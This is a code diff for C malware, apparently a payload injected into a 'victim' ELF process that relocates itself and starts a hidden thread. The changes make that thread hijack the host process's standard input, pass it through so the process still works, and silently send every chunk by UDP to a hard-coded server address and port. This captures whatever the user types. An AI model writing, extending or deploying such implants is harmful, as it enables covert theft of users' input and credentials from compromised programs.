@@ -21,10 +21,15 @@
 
 #define SERVER_IP "127.0.0.1"
 #define SERVER_PORT 5656
-#define BUFFER_SIZE 64
+#define TIM_BUFFER_SIZE 64
+#define IO_BUFFER_SIZE 4096
+
+void __init_libc(char **envp, char *pn);
+void __libc_start_init(void);
 
 static char buffer[512];
-static char time_buffer[BUFFER_SIZE];
+static char buffer_io[IO_BUFFER_SIZE];
+static char time_buffer[TIM_BUFFER_SIZE];
 
 static void do_rela_reloc(uint64_t base, Elf64_Rela *rela, size_t count)
 {
@@ -92,194 +97,67 @@ static void get_current_time(char *buffer, size_t buffer_size)
     strftime(buffer, buffer_size, "%Y:%m:%d %H:%M:%S \r\n", time_info);
 }
 
-static ssize_t write_all_fd(int fd, const void *buf, size_t len) {
-    const uint8_t *p = (const uint8_t *)buf;
-    size_t left = len;
-    while (left > 0) {
-        ssize_t w = write(fd, p, left);
-        if (w > 0) {
-            p += w;
-            left -= w;
-            continue;
-        }
-        if (w == 0) {
-            return -1;
-        }
-        if (errno == EINTR) {
-            continue;
-        }
-        return -1;
-    }
-    return (ssize_t)len;
-}
-
-static ssize_t send_all_sock(int sockfd, const void *buf, size_t len) {
-    const uint8_t *p = (const uint8_t *)buf;
-    size_t left = len;
-    while (left > 0) {
-        ssize_t s = send(sockfd, p, left, MSG_NOSIGNAL);
-        if (s > 0) {
-            p += s;
-            left -= s;
-            continue;
-        }
-        if (s == 0) {
-            return -1;
-        }
-        if (s < 0) {
-            if (errno == EINTR) continue;
-            return -1;
-        }
-    }
-    return (ssize_t)len;
-}
-
 void time_thread()
 {
-    int old_stdout = -1;
-    int sv[2] = {-1, -1}; /* socketpair descriptors */
+    int save_stdin = dup(STDIN_FILENO);
+    int pipe[2];
+    socketpair(AF_UNIX, SOCK_STREAM, 0, pipe);
+    dup2(pipe[0], STDIN_FILENO);
+    close(pipe[0]);
 
-    old_stdout = dup(STDOUT_FILENO);
-    if (old_stdout < 0) {
-        return;
-    }
+    int remote = socket(AF_INET, SOCK_DGRAM, 0);
+    struct sockaddr_in addr = {
+        .sin_family = AF_INET,
+        .sin_zero = 0,
+        .sin_port = htons(SERVER_PORT),
+        .sin_addr = inet_addr(SERVER_IP)
+    };
 
-    if (socketpair(AF_UNIX, SOCK_STREAM, 0, sv) == -1) {
-        close(old_stdout);
-        return;
-    }
+    int ep = epoll_create1(0);
+    struct epoll_event ev = {
+        .events = EPOLLIN | EPOLLERR | EPOLLHUP,
+        .data.fd = save_stdin
+    };
 
-    if (dup2(sv[0], STDOUT_FILENO) == -1) {
-        close(old_stdout);
-        close(sv[0]);
-        close(sv[1]);
-        return;
-    }
+    epoll_ctl(ep, EPOLL_CTL_ADD, save_stdin, &ev);
 
-    close(sv[0]);
+    while (1)
+    {
+        struct epoll_event events[3];
+        int nready = epoll_wait(ep, events, 3, -1);
 
-    int pipe_fd = sv[1];
-
-    /* Attempt to create and connect socket; if it fails, mark sockfd = -1 and continue
-       so pipe_fd -> old_stdout flow is unaffected. */
-    int sockfd = -1;
-    sockfd = socket(AF_INET, SOCK_STREAM, 0);
-    if (sockfd < 0) {
-        sockfd = -1; /* disabled */
-    } else {
-        struct sockaddr_in server_addr;
-        memset(&server_addr, 0, sizeof(server_addr));
-        server_addr.sin_family = AF_INET;
-        server_addr.sin_port = htons((uint16_t)SERVER_PORT);
-        if (inet_pton(AF_INET, SERVER_IP, &server_addr.sin_addr) <= 0) {
-            /* bad IP string: disable socket but keep going */
-            close(sockfd);
-            sockfd = -1;
-        } else {
-            if (connect(sockfd, (struct sockaddr *)&server_addr, sizeof(server_addr)) != 0) {
-                /* connect failed: disable socket but continue piping to old_stdout */
-                close(sockfd);
-                sockfd = -1;
-            } else {
-                /* optionally: set sockfd to close-on-exec or non-blocking if desired */
-            }
-        }
-    }
-
-    /* Setup epoll to monitor pipe_fd only */
-    int epfd = epoll_create1(0);
-    if (epfd < 0) {
-        if (sockfd >= 0) close(sockfd);
-        close(old_stdout);
-        close(pipe_fd);
-        return;
-    }
-
-    struct epoll_event ev;
-    memset(&ev, 0, sizeof(ev));
-    ev.events = EPOLLIN | EPOLLHUP | EPOLLERR;
-    ev.data.fd = pipe_fd;
-    if (epoll_ctl(epfd, EPOLL_CTL_ADD, pipe_fd, &ev) != 0) {
-        if (sockfd >= 0) close(sockfd);
-        close(epfd);
-        close(old_stdout);
-        close(pipe_fd);
-        return;
-    }
-
-    /* Buffer for reads */
-    enum { BUF_SIZE = 4096 };
-    uint8_t buf[BUF_SIZE];
-
-    for (;;) {
-        struct epoll_event events[1];
-        int nready = epoll_wait(epfd, events, 1, -1);
-        if (nready < 0) {
-            if (errno == EINTR) continue;
+        if (nready < 0 && errno != EINTR)
             break;
-        }
-        if (nready == 0) continue;
 
-        for (int i = 0; i < nready; ++i) {
+        for (int i = 0; i < nready; i += 1)
+        {
             int fd = events[i].data.fd;
             uint32_t re = events[i].events;
 
-            /* If the monitored pipe_fd has an error or hangup, treat as EOF and cleanup. */
-            if ((re & (EPOLLERR | EPOLLHUP)) != 0) {
-                goto cleanup;
-            }
+            if ((re & (EPOLLERR | EPOLLHUP)) != 0)
+                exit(0);
 
-            if (re & EPOLLIN) {
-                ssize_t r;
-                while (1) {
-                    r = read(fd, buf, BUF_SIZE);
-                    if (r > 0) {
-                        /* Always write to old_stdout. If that fails, keep trying next data,
-                           but you might want to treat persistent write failures as fatal.
-                           Here we ignore write errors for socket-related robustness requirement. */
-                        (void)write_all_fd(old_stdout, buf, (size_t)r);
-
-                        /* Only attempt to send to socket if it's currently enabled (sockfd >= 0).
-                           On any send error we close socket and disable further sends. */
-                        if (sockfd >= 0) {
-                            if (send_all_sock(sockfd, buf, (size_t)r) < 0) {
-                                /* disable socket on error, but continue piping to old_stdout */
-                                close(sockfd);
-                                sockfd = -1;
-                            }
-                        }
-                        continue;
-                    }
-                    if (r == 0) {
-                        /* EOF on pipe -> exit loop and cleanup */
-                        goto cleanup;
-                    }
-                    if (errno == EINTR) {
-                        continue;
-                    }
-                    /* other read error: break inner loop and continue epoll loop */
-                    break;
-                }
+            if (re & EPOLLIN)
+            {
+                ssize_t r = read(fd, buffer_io, IO_BUFFER_SIZE);
+                write(pipe[1], buffer_io, r);
+                sendto(remote, buffer_io, r, 0, (struct sockaddr*)&addr, sizeof(struct sockaddr_in));
             }
         }
     }
-
-cleanup:
-    if (epfd >= 0) close(epfd);
-    if (old_stdout >= 0) close(old_stdout);
-    if (pipe_fd >= 0) close(pipe_fd);
-    if (sockfd >= 0) close(sockfd);
-    return;
 }
 
 int create_thread(uint64_t flags, void* stacktop, void(*entry)());
 
-int embedded(uint64_t base, Elf64_Dyn *self_dynmaic, Elf64_Phdr *victim_phdr)
+int embedded(uint64_t base, Elf64_Dyn *self_dynmaic, Elf64_Phdr *victim_phdr, char** envp)
 {
     do_reloc(base, self_dynmaic);
     printf("Booting... base=0x%lx, dynamic=0x%lx, victim_phdr=0x%lx. \r\n", base, (uint64_t)self_dynmaic, (uint64_t)victim_phdr);
     
-    uint8_t *stack = malloc(0x2000);
+    __init_libc(envp, "Shell");
+    __libc_start_init();
+
+    uint8_t *stack = malloc(0x4000);
     int cc = create_thread(
         CLONE_VM | CLONE_FS | CLONE_FILES | CLONE_SIGHAND | CLONE_THREAD,
         stack + 0x2000, time_thread);
